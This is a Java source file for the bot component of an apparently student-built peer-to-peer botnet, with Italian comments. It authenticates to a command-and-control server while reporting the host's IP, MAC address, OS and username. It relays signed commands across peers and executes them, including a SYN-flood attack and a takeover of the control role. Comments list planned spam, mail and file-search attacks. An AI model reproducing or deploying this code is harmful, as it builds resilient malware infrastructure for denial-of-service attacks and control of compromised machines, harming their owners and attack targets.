package cs.sii.bot.action;

import java.security.InvalidKeyException;
import java.security.PublicKey;
import java.security.SignatureException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;

import org.apache.jasper.tagplugins.jstl.core.ForEach;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import cs.sii.config.onLoad.Config;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.domain.SyncIpList;
import cs.sii.model.bot.Bot;
import cs.sii.model.role.Role;
import cs.sii.model.user.User;
import cs.sii.network.request.BotRequest;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.connection.P2PMan;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.dao.BotServiceImpl;
import cs.sii.service.dao.RoleServiceImpl;
import cs.sii.service.dao.UserServiceImpl;

@Service
public class Behavior {

	@Autowired
	private NetworkService nServ;
	@Autowired
	private Config eng;

	@Autowired
	private BotRequest req;

	@Autowired
	private Auth auth;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private Malicious malS;

	@Autowired
	private BotServiceImpl bServ;

	@Autowired
	private RoleServiceImpl rServ;

	@Autowired
	private UserServiceImpl uServ;

	@Autowired
	private P2PMan pServ;

	// Il secondo valore è vuoto però ci serviva una lista sincata per non
	// implementarla di nuovo

	private SyncIpList<Integer, String> msgHashList = new SyncIpList<Integer, String>();

	/**
	 * just needed for initialize beans
	 * 
	 */
	public Behavior() {
	}

	/**
	 * 
	 */
	public void initializeBot() {
		// nServ.firstConnectToMockServerDns();
		if (challengeToCommandConquer()) {
			System.out.println("Bot Autenticazione riuscita");
		} else
			System.out.println("Bot Autenticazione fallita");
		// System.out.println("Bot not Ready, authentication failed");

		String data = nServ.getIdHash();
		SyncIpList<IP, PublicKey> ips = nServ.getCommandConquerIps();
		List<Pairs<String, String>> response = null;
		System.out.println("Richiedo vicini al C&C");
		response = req.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(), data);
		List<Pairs<IP, PublicKey>> newNeighbours = new ArrayList<Pairs<IP, PublicKey>>();

		if (response != null) {
			response.forEach(ob -> System.out.println("Vicinato " + ob.getValue1().toString()));
		} else
			System.out.println("Risposta vicini null");
		newNeighbours = nServ.tramsuteNeigha(response);
		if (newNeighbours != null) {
			newNeighbours.forEach(ob -> System.out.println("Vicinato convertito " + ob.getValue1().toString()));
		} else
			System.out.println("Risposta vicini senza elementi");
		nServ.getNeighbours().setAll(newNeighbours);

		SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
		buf.setAll(newNeighbours);
		nServ.setNeighbours(buf);
		System.out.println("Avviso i mie vicini di conoscerli");
		challengeToBot();
		System.out.println("INIZIALIZZAZIONE COMPLETATA, BOT READY");
	}

	/**
	 * challenges one of the CeC
	 * 
	 * @return true if the challenges goes well
	 */
	private boolean challengeToCommandConquer() {
		Boolean flag = true;
		while (flag) {
			System.out.println("Richiesta challenge a C&C " + nServ.getCommandConquerIps().get(0).getValue1());
			Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(),
					nServ.getCommandConquerIps().get(0).getValue1());
			if (challenge != null) {
				if (challenge.getValue2() != -1) {
					String key = auth.generateStringKey(challenge.getValue2());
					String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
					System.out.println(hashMac);
					String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(),
							nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(),
							nServ.getCommandConquerIps().get(0).getValue1(), hashMac, pki.getPubRSAKey(),
							nServ.isElegible());
					System.out.println("La risposta del C&C: " + response);
					flag = false;
					return true;
				}else{
					return true;
				}
			}
		}
		return false;
	}

	// verify bot

	// verify msgbyCec

	// asynch thread
	// decript msg

	// send to neighbourhood

	// execute

	// answer yes

	// else answer no

	// /**
	// * Convert a String with format red|green|blue|alpha
	// * to a Color object
	// */
	// @Override
	// public Color convertToEntityAttribute(String colorString) {
	// String[] rgb = colorString.split(SEPARATOR);
	// return new Color(Integer.parseInt(rgb[0]),
	// Integer.parseInt(rgb[1]),
	// Integer.parseInt(rgb[2]),
	// Integer.parseInt(rgb[3]));
	// }

	// IDMSG|COMANDO|SIGNATURE(idmsg)

	/**
	 * @param rawData
	 */
	@Async
	public void floodAndExecute(String rawData, IP ip) {

		String msg = "";

		// decritta il msg
		System.out.println("Decripto richiesta di flood");
		msg = pki.getCrypto().decryptAES(rawData);
		if (msg == null)
			return;
		// System.out.println("msg: " + msg.toString());
		// Per comodità
		String[] msgs = msg.split("<HH>");

		// for (int i = 0; i < msgs.length; i++) {
		// System.out.println("msgs[" + i + "]= " + msgs[i]);
		// }

		// hai gia ricevuto questo msg? bella domanda
		if (msgHashList.indexOfValue2(msgs[0]) < 0) {
			// System.out.println("idHashMessage " + msgs[0]);
			System.out.println("Nuovo comando da eseguire");
			// verifica la firma con chiave publica c&c
			try {
				// System.out.println("signature" + msgs[2]);
				// System.out.println(" pk " +
				// pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
				if (pki.validateSignedMessageRSA(msgs[0], msgs[2], nServ.getCommandConquerIps().get(0).getValue2())) {
					Pairs<Integer, String> data = new Pairs<>();
					data.setValue1(msgHashList.getSize() + 1);
					data.setValue2(msgs[0]);
					msgHashList.add(data);
					System.out.println("Signature OK");
					// se verificato inoltralo ai vicini
					System.out.println("Flood a vicini");
					floodNeighoours(rawData, ip);
					// inoltra all'interpretedei msg
					executeCommand(msgs[1]);

				} else {
					System.out.println("Signature Comando FALLITA");
				}
			} catch (InvalidKeyException | SignatureException e) {
				System.out.println("Errore verifica Signature durante il flooding " + msgs[2]);
				e.printStackTrace();
			}
		} else {
			System.out.println("Comando gia eseguito");
		}

	}

	@Async
	private void floodNeighoours(String msg, IP ip) {
		SyncIpList<IP, PublicKey> listNeighbourst = nServ.getNeighbours();
		for (int i = 0; i < listNeighbourst.getSize(); i++) {
			Pairs<IP, PublicKey> p = listNeighbourst.get(i);

			if (!ip.getIp().equals(p.getValue1().getIp())) {
				req.sendFloodToOtherBot(p.getValue1(), msg);
				System.out.println("flood vicino " + p.getValue1().getIp());
			}
		}

		// nServ.getNeighbours().getList().forEach((pairs) -> {
		// System.out.println("pairs ip"+pairs.getValue1().getIp());
		// req.sendFloodToOtherBot(pairs.getValue1(), msg);
		// });

		// cripta il messaggio e invialo ai vicini

	}

	// TODO definire attacchi
	@Async
	private void executeCommand(String msg) {
		System.out.println("Eseguendo comando " + msg);
		if (msg.startsWith("newking")) {
			updateCecInfo(msg);
		}
		if (msg.startsWith("synflood")) {
			malS.synFlood(msg);
		}
		if (msg.startsWith("")) {

		}
		if (msg.startsWith("")) {

		}

		// che comando è?
		// spam
		// attack
		// search file
		// Mail
		// Update vicinato
		//
		System.out.println("COMANDO ESEGUTO");
	}

	public void updateCecInfo(String msg) {
		String[] msgs = msg.split("<CC>");
		nServ.getCommandConquerIps().remove(0);
		Pairs<IP, PublicKey> pairs = new Pairs<IP, PublicKey>(new IP(msgs[1]), pki.rebuildPuK(msgs[2]));
		nServ.getCommandConquerIps().add(pairs);
		// Svuota lista sg (verrano riiutati in automatico in quanto fimrati con
		// chiave vecchia)
		System.out.println("C&C AGGIORNATO");

	}

	public BotRequest getRequest() {
		return req;
	}

	public void setRequest(BotRequest request) {
		this.req = request;
	}

	public Pairs<Long, Integer> authReqBot(String idBot) {
		System.out.println(" inizio authreqbot");
		if (auth.getNeighSeed().indexOfValue1(idBot) >= 0)
			return auth.getNeighSeed().getByValue1(idBot).getValue2();
		Long keyNumber = new Long(auth.generateNumberText());
		Integer iterationNumber = new Integer(auth.generateIterationNumber());
		System.out.println("keyNumber " + keyNumber);
		System.out.println("IterationNumber " + iterationNumber);
		System.out.println("idbot " + idBot);
		Pairs<Long, Integer> challenge = new Pairs<Long, Integer>(keyNumber, iterationNumber);
		Pairs<String, Pairs<Long, Integer>> map = new Pairs<String, Pairs<Long, Integer>>(idBot, challenge);

		System.out.println("map " + map.getValue1());
		boolean x = auth.getNeighSeed().add(map);
		System.out.println("add challenge bot neigh " + x);
		System.out.println(" fine authreqbot");

		return challenge;
	}

	public Boolean checkHmacBot(ArrayList<Object> objects) {
		Boolean response = false;
		System.out.println(" inizio check");
		SyncIpList<String, Pairs<Long, Integer>> lista = auth.getNeighSeed();
		System.out.println("size lista hmac vicini " + lista.getSize());
		String idBot = objects.get(0).toString();
		String hashMac = objects.get(1).toString();
		if (lista != null && lista.getSize() > 0) {
			Pairs<String, Pairs<Long, Integer>> buff = lista.removeByValue1(idBot);
			if (buff != null) {
				Pairs<Long, Integer> coppia = buff.getValue2();
				Long keyNumber = coppia.getValue1();
				Integer iterationNumber = coppia.getValue2();
				if (coppia != null) {
					System.out.println("keyNumber " + keyNumber);
					System.out.println("IterationNumber " + iterationNumber);
					System.out.println("idbot " + idBot);

					if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
						response = true;
						objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
						// aggiungere a vicini
					}
				}
			} else
				System.out.println("hmac bot nofound " + idBot);
		}
		System.out.println(" fine check");

		System.out.println("");
		return response;
	}

	/**
	 * challenges one of the CeC
	 * 
	 * @return true if the challenges goes well
	 * @throws ExecutionException
	 * @throws InterruptedException
	 */

	private void challengeToBot() {
		System.out.println("Invio challenge ai miei vicini ");

		SyncIpList<IP, PublicKey> listNegh = nServ.getNeighbours();

		SyncIpList<Future<Pairs<Long, Integer>>, IP> botResp = new SyncIpList<Future<Pairs<Long, Integer>>, IP>();

		for (int i = 0; i < listNegh.getSize(); i++) {
			Pairs<IP, PublicKey> pairs = listNegh.get(i);
			Future<Pairs<Long, Integer>> result = req.getChallengeFromBot(nServ.getIdHash(), pairs.getValue1());
			Pairs<Future<Pairs<Long, Integer>>, IP> element = new Pairs<Future<Pairs<Long, Integer>>, IP>(result,
					pairs.getValue1());
			botResp.add(element);
		}
		System.out.println("Richieste inviate attendo le risposte");
		while (botResp.getSize() != 0) {
			for (int i = 0; i < botResp.getSize(); i++) {
				Pairs<Future<Pairs<Long, Integer>>, IP> coppia = botResp.get(i);
				if (coppia.getValue1().isDone()) {
					botResp.remove(coppia);
					if (coppia.getValue1() != null) {
						Pairs<Long, Integer> resp;
						try {
							resp = coppia.getValue1().get();
							IP dest = coppia.getValue2();
							System.out.println("dest " + dest);
							if (resp != null) {
								System.out.println("resp " + resp.getValue1());
								String key = auth.generateStringKey(resp.getValue2());
								System.out.println("key " + key);
								String hashMac = auth.generateHmac(resp.getValue1(), auth.generateSecretKey(key));
								System.out.println("keyNumber " + resp.getValue1());
								System.out.println("IterationNumber " + resp.getValue2());
								System.out.println("hash " + hashMac);
								Boolean b = false;
								b = req.getResponseFromBot(nServ.getIdHash(), dest, hashMac, pki.getPubRSAKey());
								if (b != null && b) {

									System.out.println("botSize " + botResp.getSize());
								} else {
									System.out.println("challenge vicini  hmac null o false" + b);
								}
							} else {
								System.out.println("Il vicino ha risposto  null, nessun valore challenge");
							}

						} catch (InterruptedException | ExecutionException e) {
							System.out.println("Errore connessione da ip " + coppia.getValue2().toString());
							e.printStackTrace();
						}
					} else {
						System.out.println("Rimosso hmac in attesa vicinato " + coppia.getValue2());

					}
				}
			}
		}

		// return true;
	}

	// class RolesComp implements Comparator<Role>{
	//
	// @Override
	// public int compare(Role a, Role b ){
	// if(a.getId()>b.getId())
	// return 1
	// }
	// }

	/**
	 * @param ip
	 */
	@Async
	public void getPower(String ip) {
		pServ.setNewKing(nServ.getIdHash());
		System.out.println("Creo grafo rete P2P");
		pServ.createNetworkP2P();
		String myId = pki.getCrypto().encryptAES(nServ.getIdHash());
		System.out.println("Importo Database dal C&C");
		// richiesta ruoli
		List<Role> roles = req.getRoles(ip, myId);
		if (roles != null) {
			Collections.sort(roles, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
			roles.forEach(role -> System.out.println("Ruolo: " + role));
			rServ.saveAll(roles);
		}
		// richiesta bots
		List<Bot> bots = req.getBots(ip, myId);
		if (bots != null) {
			Collections.sort(bots, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
			bots.forEach(bot -> System.out.println("Bot: " + bot));
			bServ.saveAll(bots);
		}

		// richiesta users
		List<User> users = req.getUser(ip, myId);
		if (users != null) {
			Collections.sort(users, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
			users.forEach(user -> System.out.println("Utenti: " + user));
			uServ.saveAll(users);
		}
		// prendo grafo
		List<String> graph = req.getPeers(ip, myId);

		graph.forEach(e -> System.out.println("Archi: " + e));
		// informo cc vecchio che spnp ready

		List<IP> vertex = new ArrayList<IP>();
		List<Pairs<IP, IP>> edge = new ArrayList<Pairs<IP, IP>>();
		List<String[]> strs = new ArrayList<String[]>();
		for (String str : graph) {
			String[] sts = str.split("<HH>");
			for (int i = 0; i < sts.length; i++) {
				System.out.println("parse edge " + i + " " + sts[i]);
			}
			edge.add(new Pairs<IP, IP>(new IP(sts[0]), new IP(sts[1])));
			if (!vertex.contains(new IP(sts[0])))
				vertex.add(new IP(sts[0]));
			if (!vertex.contains(new IP(sts[1])))
				vertex.add(new IP(sts[1]));
		}
		edge.forEach(e -> System.out.println("edge " + e.getValue1() + " to " + e.getValue2()));
		vertex.forEach(v -> System.out.println("vertex " + v.getIp()));
		System.out.println("Aggiorno grafo rete P2P con quello del C&C");
		pServ.updateNetworkP2P(edge, vertex);

		SyncIpList<IP, String> gg = nServ.getAliveBot();

		for (Bot bot : bots) {
			if (vertex.indexOf(new IP(bot.getIp())) >= 0)
				gg.add(new Pairs<IP, String>(new IP(bot.getIp()), bot.getIdBot()));
		}

		// avvisa cec che se ready
		Boolean b = req.ready(ip, myId);
		if ((b != null) && (b)) {
			System.out.println("SONO IL NUOVO C&C");
			eng.setCommandandconquerStatus(true);
			// nServ.getCommandConquerIps().remove(0); non lo faccio più perché
			// mi aggiorno con il flood del cec
			// nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>(
			// nServ.getMyIp(), pki.getPubRSAKey()));
			pServ.setNewKing("");
		}
		// controllare risposta da cec che ha avvisato dns
	}

	public void pingToNeighbours() {
		System.out.println("PING a vicini e vedo se sono vivi");
		SyncIpList<IP, PublicKey> listNegh = nServ.getNeighbours();
		SyncIpList<Future<Boolean>, IP> botResp = new SyncIpList<Future<Boolean>, IP>();
		List<IP> listDeadNegh = new ArrayList<IP>();

		for (int i = 0; i < listNegh.getSize(); i++) {
			Pairs<IP, PublicKey> pairs = listNegh.get(i);
			Future<Boolean> result = req.pingToBot(pairs.getValue1().toString());
			Pairs<Future<Boolean>, IP> element = new Pairs<Future<Boolean>, IP>(result, pairs.getValue1());
			botResp.add(element);
		}

		while (botResp.getSize() != 0) {
			for (int i = 0; i < botResp.getSize(); i++) {
				Pairs<Future<Boolean>, IP> coppia = botResp.get(i);
				if (coppia.getValue1().isDone()) {
					botResp.remove(coppia);
					if (coppia.getValue1() != null) {
						Boolean response;
						try {
							response = coppia.getValue1().get();
							IP dest = coppia.getValue2();
							if (response) {
								System.out.println("Il vicino " + dest + " è vivo");
							} else {
								listDeadNegh.add(coppia.getValue2());
								System.out.println("Il vicino " + dest + " è morto");
							}

						} catch (InterruptedException | ExecutionException e) {
							System.out.println("Errore connessione da ip " + coppia.getValue2().toString());
							e.printStackTrace();
						}
					} else {
						listDeadNegh.add(coppia.getValue2());
					}
				}
			}
		}
		if (!listDeadNegh.isEmpty())
			syncNeightoCec(listDeadNegh);
		System.out.println("Fase di PING conclusa");
	}

	private void syncNeightoCec(List<IP> listDeadNegh) {
		// invico a cec di mia nuova lista vicini ovvero di chi mi ha risposto

		List<Pairs<IP, PublicKey>> newNeighbours = new ArrayList<Pairs<IP, PublicKey>>();
		List<Pairs<String, String>> response = null;
		if (!eng.isCommandandconquerStatus()) {
			response = req.sendDeadNeighToCeC(nServ.getCommandConquerIps().get(0).getValue1().toString(),
					nServ.getIdHash(), listDeadNegh);
			if (response != null) {
				newNeighbours = nServ.tramsuteNeigha(response);
				if (newNeighbours != null) {
					newNeighbours.forEach(ob -> System.out.println("Vicinato convertito " + ob.getValue1().toString()));
				} else
					System.out.println("Risposta vicini senza elementi");

				SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
				buf.setAll(newNeighbours);
				nServ.setNeighbours(buf);
				System.out.println("Avviso i mie vicini di conoscerli");
				challengeToBot();
			} else {
				System.out.println("Errore invio morti al CeC");
			}
		} else {
			System.out.println("Sono CeC e mi auto sincronizzo");
			for (IP botDead : listDeadNegh) {
				nServ.getAliveBot().removeByValue1(botDead);
				nServ.getNeighbours().removeByValue1(botDead);
				pServ.updateNetworkP2P();
			}

		}
	}

	public P2PMan getpServ() {
		return pServ;
	}

	public void setpServ(P2PMan pServ) {
		this.pServ = pServ;
	}
}
